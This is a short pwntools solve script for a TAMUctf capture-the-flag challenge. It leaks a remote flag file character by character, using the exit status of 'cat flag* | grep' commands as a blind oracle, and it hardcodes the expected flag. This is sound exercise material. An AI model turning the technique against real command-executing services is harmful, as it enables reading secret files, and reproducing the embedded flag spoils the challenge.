#!/usr/bin/env python3
import pwn
from string import printable

# pwn.context.log_level = 'DEBUG'

IP, PORT = 'challenges.tamuctf.com', 3424
p = pwn.remote(IP, PORT)

def execute(payload):
    p.sendlineafter('Execute: ', payload)
    return int(p.recvline(keepends=False))


flag = 'gigem{'
for _ in range(30):
    for char in printable:
        if char in ['\\']:
            continue
        flag_cand = flag + char
        ret = execute('cat flag* | grep -F {}'.format('"{}"'.format(flag_cand)))
        if ret == 0:
            flag = flag_cand
            pwn.log.info(flag)
            if char == '}':
                assert flag == 'gigem{r3v3r53_5h3ll5}'
                pwn.log.success('flag = {}'.format(flag))
                exit()
            break
